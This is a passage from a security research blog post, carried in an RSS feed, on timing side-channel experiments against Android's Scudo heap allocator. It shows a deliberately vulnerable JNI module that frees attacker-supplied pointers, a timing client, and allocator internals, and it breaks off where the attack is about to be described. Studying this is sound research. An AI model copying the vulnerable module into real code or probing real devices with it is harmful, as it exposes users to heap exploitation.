<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Scudo on lolcads tech blog</title><link>https://lolcads.github.io/tags/scudo/</link><description>Recent content in Scudo on lolcads tech blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>&amp;copy; lolcads</copyright><lastBuildDate>Fri, 26 Jul 2024 16:46:21 +0100</lastBuildDate><atom:link href="https://lolcads.github.io/tags/scudo/index.xml" rel="self" type="application/rss+xml"/><item><title>Timing Attack Experiments against Scudo (Part 2)</title><link>https://lolcads.github.io/posts/2024/07/scudo_1/</link><pubDate>Fri, 26 Jul 2024 16:46:21 +0100</pubDate><guid>https://lolcads.github.io/posts/2024/07/scudo_1/</guid><description>Attempting Timing Attacks against Scudo In this second blog post we will take a different approach for attacking Scudo, i.e. we will try to the measure execution times for calls to malloc and hope to be able to derive a portion of the internal state of the allocator (i.e. perform side channel attacks). The version of Scudo considered in this blog post is 161cca266a9d0b6deb5f1fd2de8ad543649a7fa1.
There will be almost only negative results (which means I unfortunately could not make it work), except for one.</description><content>&lt;h1 id="attempting-timing-attacks-against-scudo">Attempting Timing Attacks against &lt;em>Scudo&lt;/em>&lt;/h1>
&lt;p>In this second blog post we will take a different approach for attacking &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/;bpv=0;bpt=0">&lt;em>Scudo&lt;/em>&lt;/a>, i.e. we will try to the measure execution times for calls to &lt;code>malloc&lt;/code> and hope to be able to derive a portion of the internal state of the allocator (i.e. perform side channel attacks). The version of Scudo considered in this blog post is &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/METADATA;l=19;drc=45e1036faa0dcfa30a01982880be1137d441333d">&lt;code>161cca266a9d0b6deb5f1fd2de8ad543649a7fa1&lt;/code>&lt;/a>.&lt;/p>
&lt;p>There will be almost only negative results (which means I unfortunately could not make it work), except for one. The main conclusion we can draw from this post is that &lt;em>Scudo&lt;/em> is &lt;strong>not&lt;/strong> designed to mitigate timing attacks! This follows from trying to leak a piece of information and then accidentally leaking a different and unclassified piece.&lt;/p>
&lt;p>&lt;strong>Disclaimer&lt;/strong>: The following analyses can be incomplete and/or incorrect. Also the experiments conducted are on a &lt;strong>very&lt;/strong> basic level compared to the complex field of &lt;em>Data Science&lt;/em>. The style of this post is informal and chosen based on the idea of practical attacks on Android.&lt;/p>
&lt;h2 id="experimental-setup">Experimental Setup&lt;/h2>
&lt;p>As usual, there is a module for the &lt;em>damnvulnerableapp&lt;/em> of the form:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">JNIEXPORT jbyteArray JNICALL
&lt;span style="color:#a6e22e">Java_com_damnvulnerableapp_vulnerable_modules_HeapSCAModule_handleMessage&lt;/span>(JNIEnv &lt;span style="color:#f92672">*&lt;/span>env,
jclass class,
jbyteArray message) {
&lt;span style="color:#66d9ef">uint32_t&lt;/span> length &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetArrayLength(env, message);
&lt;span style="color:#66d9ef">if&lt;/span> (length &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;span style="color:#66d9ef">return&lt;/span> NULL;
jbyte &lt;span style="color:#f92672">*&lt;/span>raw &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetByteArrayElements(env, message, NULL);
&lt;span style="color:#66d9ef">if&lt;/span> (raw) {
jbyteArray result &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>NewByteArray(env, &lt;span style="color:#ae81ff">8&lt;/span>);
&lt;span style="color:#66d9ef">switch&lt;/span> (raw[&lt;span style="color:#ae81ff">0&lt;/span>]) {
&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> {
&lt;span style="color:#75715e">// Malloc
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">uint64_t&lt;/span> size &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>((&lt;span style="color:#66d9ef">uint64_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>raw[&lt;span style="color:#ae81ff">1&lt;/span>]);
&lt;span style="color:#66d9ef">uint8_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>ptr;
ptr &lt;span style="color:#f92672">=&lt;/span> malloc(size);
(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>SetByteArrayRegion(env, result, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">8&lt;/span>, (jbyte&lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>ptr);
&lt;span style="color:#66d9ef">break&lt;/span>;
}
&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span> {
&lt;span style="color:#75715e">// Free
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">uint8_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>ptr &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">uint8_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">uint64_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>raw[&lt;span style="color:#ae81ff">1&lt;/span>]);
free(ptr);
(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>SetByteArrayRegion(env, result, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">8&lt;/span>, (jbyte&lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>ptr);
&lt;span style="color:#66d9ef">break&lt;/span>;
}
}
&lt;span style="color:#66d9ef">return&lt;/span> result;
}
&lt;span style="color:#66d9ef">return&lt;/span> NULL;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>This module lets the user directly control whether and how to call &lt;code>malloc&lt;/code> and &lt;code>free&lt;/code>, or, to be more precise, &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=292;bpv=0;bpt=0">&lt;code>Allocator::allocate&lt;/code>&lt;/a> and &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=507;bpv=0;bpt=0">&lt;code>Allocator::deallocate&lt;/code>&lt;/a>. The input is composed like this: &lt;code>&amp;lt;func id&amp;gt;&amp;lt;size | ptr&amp;gt;&lt;/code> (9 bytes).&lt;/p>
&lt;p>&lt;em>damnvulnerableapp&lt;/em> is run in an &lt;em>x86-64&lt;/em> emulator (Pixel 3) running Android 12 and forwards &lt;em>remote&lt;/em> user requests to the above module. It is already expected to see a lot of timing noise based on this setup.&lt;/p>
&lt;p>Notice that measuring execution time of a remote call to e.g. &lt;code>malloc(0x10)&lt;/code> (primary allocation) will actually measure execution time of a call to &lt;code>Java_com_damnvulnerableapp_vulnerable_modules_HeapSCAModule_handleMessage&lt;/code>, which is called from Java.&lt;/p>
&lt;p>As regards the client used to communicate with the app, it is written in &lt;em>C&lt;/em>, thus it is expected to run faster than the former &lt;em>Python&lt;/em> client. Because &lt;em>damnvulnerableapp&lt;/em> uses a request - response model, i.e. a client has to request e.g. &lt;code>malloc(0x10)&lt;/code>, gets a response that the request &amp;ldquo;worked&amp;rdquo; and then has to fetch the result with a second request, the time measurements are conducted as follows:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">&lt;span style="color:#66d9ef">struct&lt;/span> timespec before;
&lt;span style="color:#66d9ef">struct&lt;/span> timespec after;
...
&lt;span style="color:#75715e">// Request malloc(0x10)
&lt;/span>&lt;span style="color:#75715e">&lt;/span>app_forward(fd, (&lt;span style="color:#66d9ef">uint8_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)message, &lt;span style="color:#ae81ff">9&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>buffer, &lt;span style="color:#f92672">&amp;amp;&lt;/span>buffer_length, &lt;span style="color:#f92672">&amp;amp;&lt;/span>before);
&lt;span style="color:#75715e">// Free response buffer
&lt;/span>&lt;span style="color:#75715e">&lt;/span>free(buffer);
&lt;span style="color:#75715e">// Request result of malloc(0x10)
&lt;/span>&lt;span style="color:#75715e">&lt;/span>app_fetch(fd, &lt;span style="color:#f92672">&amp;amp;&lt;/span>buffer, &lt;span style="color:#f92672">&amp;amp;&lt;/span>buffer_length, &lt;span style="color:#f92672">&amp;amp;&lt;/span>after);
&lt;span style="color:#75715e">// Extract result from response
&lt;/span>&lt;span style="color:#75715e">&lt;/span>pointer &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">uint64_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)get_content(buffer, buffer_length);
&lt;span style="color:#75715e">// Free response buffer
&lt;/span>&lt;span style="color:#75715e">&lt;/span>free(buffer);
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>app_fetch&lt;/code> and &lt;code>app_forward&lt;/code> (internally call &lt;code>app_send_formatted&lt;/code>) are the core of this client:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">&lt;span style="color:#66d9ef">enum&lt;/span> error_code &lt;span style="color:#a6e22e">app_fetch&lt;/span>(...)
{
...
result &lt;span style="color:#f92672">=&lt;/span> app_send_formatted(fd, &lt;span style="color:#e6db74">&amp;#34;CONTENT&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;FETCH&amp;#34;&lt;/span>, (&lt;span style="color:#66d9ef">uint8_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, NULL);
&lt;span style="color:#66d9ef">if&lt;/span> (result &lt;span style="color:#f92672">!=&lt;/span> error_success) {
log_error(&lt;span style="color:#e6db74">&amp;#34;Failed to forward buffer&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span> result;
}
result &lt;span style="color:#f92672">=&lt;/span> app_full_read(fd, buffer, buffer_size);
&lt;span style="color:#66d9ef">if&lt;/span> (result &lt;span style="color:#f92672">!=&lt;/span> error_success) {
log_error(&lt;span style="color:#e6db74">&amp;#34;Failed to read response to forward&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span> result;
}
&lt;span style="color:#75715e">// Measure time after fetching result
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (after_receive &lt;span style="color:#f92672">!=&lt;/span> NULL)
clock_gettime(CLOCK_THREAD_CPUTIME_ID, after_receive);
...
}
&lt;span style="color:#66d9ef">enum&lt;/span> error_code &lt;span style="color:#a6e22e">app_send_formatted&lt;/span>(...)
{
...
&lt;span style="color:#75715e">// Measure time before forwarding message
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (before_send &lt;span style="color:#f92672">!=&lt;/span> NULL)
clock_gettime(CLOCK_THREAD_CPUTIME_ID, before_send);
result &lt;span style="color:#f92672">=&lt;/span> app_full_write(fd, buffer, buffer_size &lt;span style="color:#f92672">+&lt;/span> content_length);
free(buffer);
&lt;span style="color:#66d9ef">if&lt;/span> (result &lt;span style="color:#f92672">!=&lt;/span> error_success) {
log_error(&lt;span style="color:#e6db74">&amp;#34;Failed to send request&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span> result;
}
...
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Because of the request - response model, there is additional noise introduced by being forced to make two remote requests for one e.g. &lt;code>malloc(0x10)&lt;/code>!&lt;/p>
&lt;p>Lets again summarize expected sources of noise introduced by the experimental setup:&lt;/p>
&lt;ol>
&lt;li>Android OS is emulated and therefore does not behave like an Android OS running on a &amp;ldquo;real&amp;rdquo; device (e.g. in terms of CPU power and scheduling)&lt;/li>
&lt;li>Remote access to &lt;em>damnvulnerableapp&lt;/em>. Although the emulator that runs the app is launched within the same device we will perform the measurements with, this is an additional layer of indirection.&lt;/li>
&lt;li>Call to e.g. &lt;code>malloc&lt;/code> is actually a call to &lt;code>handleMessage&lt;/code>, which has to be invoked from Java. The call stack is pretty deep&amp;hellip;&lt;/li>
&lt;li>Two requests per operation&lt;/li>
&lt;/ol>
&lt;h2 id="timing-attacks">Timing Attacks&lt;/h2>
&lt;p>In this section, timing attacks on different targets within &lt;em>Scudo&lt;/em> will be discussed.&lt;/p>
&lt;h3 id="attacking-chunks-array">Attacking Chunks Array&lt;/h3>
&lt;p>The core idea is to abuse a timing side channel on &lt;code>Allocator::allocate&lt;/code>, i.e. calling &lt;code>malloc&lt;/code> in &lt;em>damnvulnerableapp&lt;/em>. &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=69;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1">&lt;code>C-&amp;gt;Count&lt;/code>&lt;/a> will be the target of the attack, i.e. based on the measured execution times, we try to estimate the value of &lt;code>C-&amp;gt;Count&lt;/code>.&lt;/p>
&lt;p>One may ask, why &lt;code>C-&amp;gt;Count&lt;/code> is interesting. There are two reasons:&lt;/p>
&lt;ol>
&lt;li>The chunk arrays are shuffled to, among other things, prevent an attacker from predicting where the next allocated chunk will be located. E.g. this can prevent heap overflows. Knowing &lt;code>C-&amp;gt;Count&lt;/code> looks like the first natural step to predicting how the array looks like in terms of address ordering.&lt;/li>
&lt;li>&lt;code>SizeClassAllocatorLocalCache::allocate&lt;/code> contains a classical pattern for a timing side channel:
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">allocate&lt;/span>(uptr ClassId) {
...
PerClass &lt;span style="color:#f92672">*&lt;/span>C &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>PerClassArray[ClassId];
&lt;span style="color:#66d9ef">if&lt;/span> (C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Count &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) { &lt;span style="color:#75715e">// If C-&amp;gt;Count = 0, then execution time is longer than &amp;#34;usual&amp;#34;
&lt;/span>&lt;span style="color:#75715e">&lt;/span> ...
refill(C, ClassId);
...
}
&lt;span style="color:#75715e">// The rest is very fast
&lt;/span>&lt;span style="color:#75715e">&lt;/span> ...
CompactPtrT CompactP &lt;span style="color:#f92672">=&lt;/span> C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Chunks[&lt;span style="color:#f92672">--&lt;/span>C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Count];
...
&lt;span style="color:#66d9ef">return&lt;/span> Allocator&lt;span style="color:#f92672">-&amp;gt;&lt;/span>decompactPtr(ClassId, CompactP);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;p>When allocating memory from the primary allocator via e.g. &lt;code>malloc(0x10)&lt;/code>, then there is a number of allocations that will result in triggering &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=69;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>C-&amp;gt;Count == 0&lt;/code>&lt;/a>, which again triggers execution of &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=169;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>refill&lt;/code>&lt;/a>. Afterwards, assuming that batches are only pushed back through &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=182;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>drain&lt;/code>&lt;/a> or are newly allocated via &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/primary64.h;l=361;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>map&lt;/code>&lt;/a>, we can distinguish the following cases for &lt;code>C-&amp;gt;Count&lt;/code>:&lt;/p>
&lt;ol>
&lt;li>&lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=183;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>C-&amp;gt;Count = C-&amp;gt;MaxCount / 2&lt;/code>&lt;/a>. This stems from the fact that &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=84;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>deallocate&lt;/code>&lt;/a> can create batches if the corresponding &lt;code>Chunks&lt;/code> array is full. To be precise, this will trigger the execution of &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=182;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>drain&lt;/code>&lt;/a>, where &lt;code>C-&amp;gt;Count = C-&amp;gt;MaxCount&lt;/code>. Therefore the minimum &lt;code>Count = Min(C-&amp;gt;MaxCount / 2, C-&amp;gt;Count)&lt;/code> in &lt;code>drain&lt;/code> will evaluate to &lt;code>0 &amp;lt; C-&amp;gt;MaxCount / 2 &amp;lt; C-&amp;gt;MaxCount&lt;/code>. Finally, &lt;code>C-&amp;gt;Count -= Count &amp;lt;=&amp;gt; C-&amp;gt;Count = C-&amp;gt;MaxCount - C-&amp;gt;MaxCount / 2 = C-&amp;gt;MaxCount / 2&lt;/code>. Notice that &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=153;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1">&lt;code>C-&amp;gt;MaxCount = 2 * TransferBatch::getMaxCached(Size)&lt;/code>&lt;/a>. As can be seen in the next step, for &lt;code>malloc(0x10)&lt;/code>, this will result in &lt;code>C-&amp;gt;MaxCount = 2 * 13 = 26 =&amp;gt; C-&amp;gt;Count = 26 / 2 = 13&lt;/code>.&lt;/li>
&lt;li>&lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/primary64.h;l=396;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>C-&amp;gt;Count = MaxCount&lt;/code>&lt;/a>, i.e.:&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Count &lt;span style="color:#f92672">=&lt;/span> MaxCount
&lt;span style="color:#f92672">=&lt;/span> TransferBatch&lt;span style="color:#f92672">::&lt;/span>getMaxCached(Size)
&lt;span style="color:#f92672">=&lt;/span> Min(MaxNumCached, SizeClassMap&lt;span style="color:#f92672">::&lt;/span>getMaxCachedHint(Size))
&lt;span style="color:#f92672">=&lt;/span> Min(&lt;span style="color:#ae81ff">13&lt;/span>, Max(&lt;span style="color:#ae81ff">1U&lt;/span>, Min(Config&lt;span style="color:#f92672">::&lt;/span>MaxNumCachedHint, N)))
&lt;span style="color:#f92672">=&lt;/span> Min(&lt;span style="color:#ae81ff">13&lt;/span>, Max(&lt;span style="color:#ae81ff">1U&lt;/span>, Min(&lt;span style="color:#ae81ff">13&lt;/span>, (&lt;span style="color:#ae81ff">1U&lt;/span> &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> Config&lt;span style="color:#f92672">::&lt;/span>MaxBytesCachedLog) &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#66d9ef">static_cast&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>u32&lt;span style="color:#f92672">&amp;gt;&lt;/span>(Size))))
&lt;span style="color:#f92672">=&lt;/span> Min(&lt;span style="color:#ae81ff">13&lt;/span>, Max(&lt;span style="color:#ae81ff">1U&lt;/span>, Min(&lt;span style="color:#ae81ff">13&lt;/span>, (&lt;span style="color:#ae81ff">1U&lt;/span> &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">13&lt;/span>) &lt;span style="color:#f92672">/&lt;/span> Classes[ClassId &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>])))
&lt;/code>&lt;/pre>&lt;/div>&lt;p>where &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/size_class_map.h;l=269;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>Classes&lt;/code>&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">constexpr&lt;/span> u32 Classes[] &lt;span style="color:#f92672">=&lt;/span> {
&lt;span style="color:#ae81ff">0x00020&lt;/span>, &lt;span style="color:#ae81ff">0x00030&lt;/span>, &lt;span style="color:#ae81ff">0x00040&lt;/span>, &lt;span style="color:#ae81ff">0x00050&lt;/span>, &lt;span style="color:#ae81ff">0x00060&lt;/span>, &lt;span style="color:#ae81ff">0x00070&lt;/span>, &lt;span style="color:#ae81ff">0x00080&lt;/span>, &lt;span style="color:#ae81ff">0x00090&lt;/span>,
&lt;span style="color:#ae81ff">0x000a0&lt;/span>, &lt;span style="color:#ae81ff">0x000b0&lt;/span>, &lt;span style="color:#ae81ff">0x000c0&lt;/span>, &lt;span style="color:#ae81ff">0x000e0&lt;/span>, &lt;span style="color:#ae81ff">0x000f0&lt;/span>, &lt;span style="color:#ae81ff">0x00110&lt;/span>, &lt;span style="color:#ae81ff">0x00120&lt;/span>, &lt;span style="color:#ae81ff">0x00130&lt;/span>,
&lt;span style="color:#ae81ff">0x00150&lt;/span>, &lt;span style="color:#ae81ff">0x00160&lt;/span>, &lt;span style="color:#ae81ff">0x00170&lt;/span>, &lt;span style="color:#ae81ff">0x00190&lt;/span>, &lt;span style="color:#ae81ff">0x001d0&lt;/span>, &lt;span style="color:#ae81ff">0x00210&lt;/span>, &lt;span style="color:#ae81ff">0x00240&lt;/span>, &lt;span style="color:#ae81ff">0x002a0&lt;/span>,
&lt;span style="color:#ae81ff">0x00330&lt;/span>, &lt;span style="color:#ae81ff">0x00370&lt;/span>, &lt;span style="color:#ae81ff">0x003a0&lt;/span>, &lt;span style="color:#ae81ff">0x00400&lt;/span>, &lt;span style="color:#ae81ff">0x00430&lt;/span>, &lt;span style="color:#ae81ff">0x004a0&lt;/span>, &lt;span style="color:#ae81ff">0x00530&lt;/span>, &lt;span style="color:#ae81ff">0x00610&lt;/span>,
&lt;span style="color:#ae81ff">0x00730&lt;/span>, &lt;span style="color:#ae81ff">0x00840&lt;/span>, &lt;span style="color:#ae81ff">0x00910&lt;/span>, &lt;span style="color:#ae81ff">0x009c0&lt;/span>, &lt;span style="color:#ae81ff">0x00a60&lt;/span>, &lt;span style="color:#ae81ff">0x00b10&lt;/span>, &lt;span style="color:#ae81ff">0x00ca0&lt;/span>, &lt;span style="color:#ae81ff">0x00e00&lt;/span>,
&lt;span style="color:#ae81ff">0x00fb0&lt;/span>, &lt;span style="color:#ae81ff">0x01030&lt;/span>, &lt;span style="color:#ae81ff">0x01130&lt;/span>, &lt;span style="color:#ae81ff">0x011f0&lt;/span>, &lt;span style="color:#ae81ff">0x01490&lt;/span>, &lt;span style="color:#ae81ff">0x01650&lt;/span>, &lt;span style="color:#ae81ff">0x01930&lt;/span>, &lt;span style="color:#ae81ff">0x02010&lt;/span>,
&lt;span style="color:#ae81ff">0x02190&lt;/span>, &lt;span style="color:#ae81ff">0x02490&lt;/span>, &lt;span style="color:#ae81ff">0x02850&lt;/span>, &lt;span style="color:#ae81ff">0x02d50&lt;/span>, &lt;span style="color:#ae81ff">0x03010&lt;/span>, &lt;span style="color:#ae81ff">0x03210&lt;/span>, &lt;span style="color:#ae81ff">0x03c90&lt;/span>, &lt;span style="color:#ae81ff">0x04090&lt;/span>,
&lt;span style="color:#ae81ff">0x04510&lt;/span>, &lt;span style="color:#ae81ff">0x04810&lt;/span>, &lt;span style="color:#ae81ff">0x05c10&lt;/span>, &lt;span style="color:#ae81ff">0x06f10&lt;/span>, &lt;span style="color:#ae81ff">0x07310&lt;/span>, &lt;span style="color:#ae81ff">0x08010&lt;/span>, &lt;span style="color:#ae81ff">0x0c010&lt;/span>, &lt;span style="color:#ae81ff">0x10010&lt;/span>,
};
&lt;/code>&lt;/pre>&lt;/div>&lt;p>So for a small allocation, i.e. for &lt;code>ClassId = 1&lt;/code>, we get:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Count &lt;span style="color:#f92672">=&lt;/span> Min(&lt;span style="color:#ae81ff">13&lt;/span>, Max(&lt;span style="color:#ae81ff">1U&lt;/span>, Min(&lt;span style="color:#ae81ff">13&lt;/span>, &lt;span style="color:#ae81ff">0x2000&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>)))
&lt;span style="color:#f92672">=&lt;/span> Min(&lt;span style="color:#ae81ff">13&lt;/span>, Max(&lt;span style="color:#ae81ff">1U&lt;/span>, Min(&lt;span style="color:#ae81ff">13&lt;/span>, &lt;span style="color:#ae81ff">256&lt;/span>)))
&lt;span style="color:#f92672">=&lt;/span> Min(&lt;span style="color:#ae81ff">13&lt;/span>, Max(&lt;span style="color:#ae81ff">1U&lt;/span>, &lt;span style="color:#ae81ff">13&lt;/span>))
&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">13&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Notice that &lt;code>C-&amp;gt;Count = MaxCount&lt;/code> is true for all batches added to &lt;code>FreeList&lt;/code> except for the last one, because &lt;code>N&lt;/code> depends on a minimum:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">for&lt;/span> (u32 I &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; I &lt;span style="color:#f92672">&amp;lt;&lt;/span> NumberOfBlocks;) {
TransferBatch &lt;span style="color:#f92672">*&lt;/span>B &lt;span style="color:#f92672">=&lt;/span>
C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>createBatch(ClassId, &lt;span style="color:#66d9ef">reinterpret_cast&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&amp;gt;&lt;/span>(decompactPtrInternal(
CompactPtrBase, ShuffleArray[I])));
&lt;span style="color:#66d9ef">if&lt;/span> (UNLIKELY(&lt;span style="color:#f92672">!&lt;/span>B))
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">nullptr&lt;/span>;
&lt;span style="color:#66d9ef">const&lt;/span> u32 N &lt;span style="color:#f92672">=&lt;/span> Min(MaxCount, NumberOfBlocks &lt;span style="color:#f92672">-&lt;/span> I); &lt;span style="color:#75715e">// If (NumberOfBlocks - I &amp;lt; MaxCount) =&amp;gt; last iteration
&lt;/span>&lt;span style="color:#75715e">&lt;/span> B&lt;span style="color:#f92672">-&amp;gt;&lt;/span>setFromArray(&lt;span style="color:#f92672">&amp;amp;&lt;/span>ShuffleArray[I], N);
Region&lt;span style="color:#f92672">-&amp;gt;&lt;/span>FreeList.push_back(B);
I &lt;span style="color:#f92672">+=&lt;/span> N;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="single---threaded-timing---based-side-channel-attack-on-primary">Single - Threaded Timing - Based Side Channel Attack on Primary&lt;/h4>
&lt;p>Assuming that the only thread that accesses the &lt;em>Scudo&lt;/em> primary for allocations of the form &lt;code>malloc(0x10)&lt;/code> can be convinced to run this allocation with a constant, computable overhead. Then, the following attack might enable the prediction of &lt;code>C-&amp;gt;Count&lt;/code> based on measures of elapsed time:&lt;/p>
&lt;ol>
